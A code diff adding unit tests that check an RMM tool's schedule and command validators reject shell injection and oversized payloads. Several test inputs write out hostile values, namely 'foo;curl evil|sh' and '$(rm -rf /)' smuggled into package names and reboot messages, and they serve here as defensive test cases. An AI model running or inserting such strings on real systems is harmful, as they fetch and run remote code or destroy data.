@@ -4,7 +4,10 @@ import {
 	checkinPayloadSchema,
 	enrollRequestSchema,
 	rmmSettingsSchema,
-	createAlertRuleSchema
+	createAlertRuleSchema,
+	createScheduleSchema,
+	updateScheduleSchema,
+	validateCommandPayload
 } from '../../src/lib/validators-rmm.js';
 
 
@@ -503,5 +506,83 @@ describe('hmacSecret minimum 64 hex (matches agent crypto/rand 32 bytes)', () =>
 	it('rejects 32-hex (was previously the lower bound)', () => {
 		const half = goodHmac.slice(0, 32);
 		expect(enrollRequestSchema.safeParse({ token: 't', os: 'linux', arch: 'amd64', hmacSecret: half }).success).toBe(false);
+	});
+});
+
+describe('schedule payload validation (parity with dispatch)', () => {
+	const baseValid = {
+		name: 'nightly-build-update',
+		cronExpression: '0 3 * * *',
+		timeoutSeconds: 600,
+		enabled: true
+	};
+
+	it('rejects schedule with shell-injection package name', () => {
+		const r = createScheduleSchema.safeParse({
+			...baseValid,
+			type: 'package_install',
+			payload: { package: 'foo;curl evil|sh' }
+		});
+		expect(r.success).toBe(false);
+	});
+
+	it('rejects schedule with reboot message containing shell metachars', () => {
+		const r = createScheduleSchema.safeParse({
+			...baseValid,
+			type: 'reboot',
+			payload: { message: 'normal text $(rm -rf /)' }
+		});
+		expect(r.success).toBe(false);
+	});
+
+	it('rejects schedule with shell command exceeding 100 KB', () => {
+		const r = createScheduleSchema.safeParse({
+			...baseValid,
+			type: 'shell',
+			payload: { command: 'a'.repeat(100_001) }
+		});
+		expect(r.success).toBe(false);
+	});
+
+	it('rejects schedule with payload exceeding 100 KB serialized', () => {
+		const r = createScheduleSchema.safeParse({
+			...baseValid,
+			type: 'shell',
+			payload: { command: 'echo ok', extra: 'x'.repeat(120_000) }
+		});
+		expect(r.success).toBe(false);
+	});
+
+	it('accepts a clean schedule', () => {
+		const r = createScheduleSchema.safeParse({
+			...baseValid,
+			type: 'package_install',
+			payload: { package: 'curl' }
+		});
+		expect(r.success).toBe(true);
+	});
+
+	it('updateScheduleSchema rejects shell injection in payload when type is also patched', () => {
+		const r = updateScheduleSchema.safeParse({
+			type: 'package_install',
+			payload: { package: 'foo;rm -rf /' }
+		});
+		expect(r.success).toBe(false);
+	});
+
+	it('validateCommandPayload reports the same shell-injection error standalone', () => {
+		const r = validateCommandPayload('package_install', { package: 'foo;evil' });
+		expect(r.ok).toBe(false);
+		if (!r.ok) {
+			expect(r.message).toMatch(/Package name/);
+		}
+	});
+
+	it('validateCommandPayload caps total payload size at 100 KB', () => {
+		const r = validateCommandPayload('shell', { command: 'echo ok', filler: 'x'.repeat(120_000) });
+		expect(r.ok).toBe(false);
+		if (!r.ok) {
+			expect(r.message).toMatch(/100000 bytes/);
+		}
 	});
 });
